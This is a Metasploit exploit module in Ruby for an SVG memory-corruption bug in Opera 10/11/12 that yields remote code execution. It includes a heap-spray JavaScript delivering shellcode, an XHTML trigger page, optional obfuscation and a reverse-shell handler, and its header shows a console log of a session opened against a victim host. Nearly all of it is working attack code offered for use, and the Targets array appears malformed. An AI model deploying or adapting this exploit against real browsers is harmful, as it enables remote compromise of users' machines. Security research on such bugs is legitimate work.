# Exploit for Opera Browser 10/11/12 (SVG layout) Memory Corruption (0day)
#
# Vulnerability:
#
# Discovered: 2010-10-13
# Patched: 0day
# Tested on: v10.xx (v10.50, v10.51, v10.52, v10.53, v10.54, v10.6, v10.61, v10.62 and v10.63)
#                           v11.xx (v11.00, v11.01, v11.10, v11.11, v11.50 and v11.51)
#
# Exploit:
#
# Coded: 2010-10-14
# Last revision: 2011-10-08
#
# This exploit was modified with a new poc and triggering method, to hit Opera Next. The first copy was coded for v10.5x/v10.6x.
#
#
# Notes:
#
#   1) DEP bypass: possible but unreliable.
#   2) Let me know if you improve this one ;)
#       and this exploit is less reliable, even sometimes never gets crashed.
#       Anyway, I&#039;ve also seen remote code execution.
#
#
# Credits: Jose A. Vazquez of http://spa-s3c.blogspot.com
#
# Greets to: Ruben, Sinn3r, Metasploit Team, Corelan Team, EnRed20.org, etc
#
#
#
#
#
#        =[ metasploit v4.0.1-dev [core:4.0 api:1.0]
# + -- --=[ 742 exploits - 378 auxiliary - 83 post
# + -- --=[ 228 payloads - 27 encoders - 8 nops
#        =[ svn r13810 updated today (2011.10.06)
#
# msf > use windows/browser/opera_svg_0day
# msf  exploit(opera_svg_0day) > set LHOST 192.168.1.103
# LHOST => 192.168.1.103
# msf  exploit(opera_svg_0day) > exploit
# [*] Exploit running as background job.
# msf  exploit(opera_svg_0day) >
# [*] Started reverse handler on 192.168.1.103:4444
# [*] Using URL: http://0.0.0.0:8080/dpIDdyCpEoqCa5
# [*]  Local IP: http://192.168.1.103:8080/dpIDdyCpEoqCa5
# [*] Server started.
# [*] Sending stage 1 (Spraying the heap)
# [*] Sending stage 2 (Triggering the vulnerability)
# [*] Sending stage (752128 bytes) to 192.168.1.104
# [*] Sending stage 1 (Spraying the heap)
# Interrupt: use the &#039;exit&#039; command to quit
# msf  exploit(opera_svg_0day) > sessions
#
# Active sessions
# ===============
#
#   Id  Type                   Information                              Connection
#   --  ----                   -----------                              ----------
#
# msf  exploit(opera_svg_0day) > sessions -i 1
# [*] Starting interaction with 1...
#
# Process 1752 created.
#
# msf  exploit(opera_svg_0day) >
#
################################################################################################################
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
     
    def initialize(info = {})
     
        super(update_info(info,
            &#039;Name&#039;           => &#039;Opera Browser 10/11/12 (SVG layout) Memory Corruption&#039;,
            &#039;Description&#039;    => %q{
             
                This module exploits a vulnerability in the bad nesting with SVG tags. Successfully exploiting
                leads to remote code execution or denial of service condition under Windows XP SP3 (DEP = off).
                success (depending of opera.dll version). This module won&#039;t work against v10.xx because it was
                modified to exploit Opera upper to v11.
                Read the lastest references for further details.
                 
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Jose A. Vazquez&#039;
                ],
            &#039;Version&#039;        => &#039;$Revision: 0011 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://www.beyondsecurity.com/ssd.html&#039;],
                    [&#039;URL&#039;, &#039;http://spa-s3c.blogspot.com/2011/10/spas3c-sv-006opera-browser-101112-0-day.html&#039;],    # English
                    [&#039;URL&#039;, &#039;http://enred20.org/node/27&#039;]   # Spanish
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039;          => &#039;process&#039;,
                    &#039;HTTP::chunked&#039;     => true
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00",
                    &#039;Compat&#039;   =>
                        {
                            &#039;ConnectionType&#039; => &#039;-find&#039;,
                        },
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [  
 
                    # spray of ~ 450 MB.
                     
                        {
                            &#039;Method&#039; => &#039;usual&#039;,
                            &#039;MaxOffset&#039; => nil,
                            &#039;MaxSize&#039; => nil,
                            &#039;MaxBlocks&#039; => 900,
                            &#039;Ret&#039; => 0x0c0c0c0c
                        }
                    ],
                     
                    # Thanks to sinn3r of metasploit.com for this method.
                     
                    [ &#039;Opera Browser (v11.xx) / Windows XP SP3 (DEP-off)&#039;, 
                        {
                            &#039;MaxOffset&#039; => 0x800,
                            &#039;MaxSize&#039; => 0x80000,
                            &#039;MaxBlocks&#039; => 0x500,
                            &#039;Ret&#039; => 0x0c0c0c0c
                        }
                    ]
                ],
            &#039;DisclosureDate&#039; => &#039;0day&#039;,
            &#039;DefaultTarget&#039;  => 0))
             
            #Apply obfuscation by default
             
            register_options(
            [
                OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;JavaScript obfuscation&#039;, true])
            ], self.class)
             
    end
     
    def on_request_uri(cli, request)
     
        mytarget = target
         
        if(request.uri =~ /\.xhtml$/)
         
            #Send file for trigger the vulnerability
         
                 
            html = %Q|
            <html xmlns="http://www.w3.org/1999/xhtml" xmlns:svt="http://www.w3.org/2000/svg">
                <head>
                    <meta http-equiv="refresh" content="0;url=" />
                </head>
                <select1 style = &#039;padding-bottom: 8711px;background-image: url("HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH");&#039; >
                    <svt:svg>
                        <svt:title style = &#039;pointer-events: visiblePainted;font: normal small-caps 120%/120% fantasy;&#039; >
                            <svt:svg>
                                <svt:font>
                                    <svt:animateMotion>
                                        feFuncR
                                    </svt:animateMotion>
                                </svt:font>
                            </svt:svg>
                        </svt:title>
                    </svt:svg>
                </select1>
            </html>
                |
         
            #Send triggerer
         
            print_status("Sending stage 2 (Triggering the vulnerability)")
            var_contentype = &#039;application/xhtml+xml&#039;
             
        else
             
            #Sending init HTML
            print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport} (Method: #{mytarget[&#039;Method&#039;]} / Target: #{mytarget.name})")
             
            return if ((p = regenerate_payload(cli)) == nil)
             
            shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(mytarget.arch))
             
            addr_word  = [mytarget.ret].pack(&#039;V&#039;).unpack(&#039;H*&#039;)[0][0,4]
            var_timer_trigger   = (rand(3) + 2) * 1000
            var_file_trigger    =   rand_text_alpha(rand(30)+2)
             
            #Build the exploit
             
            var_url =  ((datastore[&#039;SSL&#039;]) ? "https://" : "http://")
            var_url << ((datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;])
            var_url << ":" + datastore[&#039;SRVPORT&#039;]
            var_url << get_resource
             
            #Choose the heap spray method
             
            if(mytarget[&#039;Method&#039;] == &#039;usual&#039;)
             
                spray_js = <<-JS
                 
                var shell = unescape("#{shellcode}");
                var size = shell.length * 2;
                var nopsize = 0x100000 - (size + 0x14);
                var nopsled = unescape("%u#{addr_word}");
                 
                while(nopsled.length * 2 < nopsize) {
                    nopsled += nopsled;
                }
                 
                var blocks = new Array();
                 
                for (var x = 0; x < #{mytarget[&#039;MaxBlocks&#039;]}; x++) {
                    blocks[x] = nopsled + shell;
                }
                         
                function TriggerVuln(){
                    document.write("<iframe src=&#039;#{var_url}/#{var_file_trigger}.xhtml&#039;></iframe>");
                }
                 
                JS
                 
            else
             
                #
                 
                #
                #   /*
                #       *  Heap spray for Opera that uses VirtualAlloc
                #       *  Arguments:
                #       *  @blocks     - an emtpy array
                #       *  @code       - the payload
                #       *  @offset     - padding to align the code
                #       *  @chunk_max  - max size for each allocation
                #       *  @blocks_max - max blocks
                #   */
                #
                #
             
                spray_js = <<-JS
                 
                function heap_spray(blocks, code, offset, chunk_max, blocks_max) {
                    if (chunk_max < 0x7F000) {
                        throw "This function is meant for size 0x7F000 or higher to trigger VirtualAlloc";
                    }
                     
                    chunk_max /= 2;
                 
                    var nops = unescape("%u0c0c%u0c0c");
                    while (nops.length < chunk_max) nops += nops;
                 
                    var offset_chunk = nops.substr(0, offset-code.length);
                 
                    var block = offset_chunk + code + nops.substr(0, chunk_max-offset_chunk.length-code.length);
                 
                    while (block.length % 8 != 0) block += unescape("%u0c");
                 
                    var shellcode = block.substr(0, (chunk_max-0x1c)/2);
                 
                    for (var i=0; i < blocks_max; i++) {
                        blocks[i] = shellcode + unescape("%u0c0c");
                    }
                }
                 
                var blocks = new Array();
                var code = unescape("#{shellcode}");
                heap_spray(blocks, code, #{mytarget[&#039;MaxOffset&#039;]}, #{mytarget[&#039;MaxSize&#039;]}, #{mytarget[&#039;MaxBlocks&#039;]});
                 
                function TriggerVuln(){
                    document.write("<iframe src=&#039;#{var_url}/#{var_file_trigger}.xhtml&#039;></iframe>");
                }
                 
                JS
             
            end
             
            if datastore[&#039;OBFUSCATE&#039;] == true
                spray_js = ::Rex::Exploitation::JSObfu.new(spray_js)
                spray_js.obfuscate
                trigger_sym = spray_js.sym(&#039;TriggerVuln&#039;)
                spray_js = spray_js.to_s + "setTimeout(&#039;#{trigger_sym}()&#039;,#{var_timer_trigger});"
            else
                spray_js = spray_js.to_s + "setTimeout(&#039;TriggerVuln()&#039;,#{var_timer_trigger});"
            end
             
            html = %Q|
                    <html>
                        <head>
                            <script type="text/javascript">
                                #{spray_js}    
                            </script>
                        </head>
                    <html>
                |  
             
            print_status("Sending stage 1 (Spraying the heap)")
            var_contentype = &#039;text/html&#039;
                 
        end
     
    #Response
    send_response(cli, html, { &#039;Content-Type&#039; => var_contentype, &#039;Pragma&#039; => &#039;no-cache&#039; })
    #Handle the payload        
    handler(cli)
         
    end
     
end

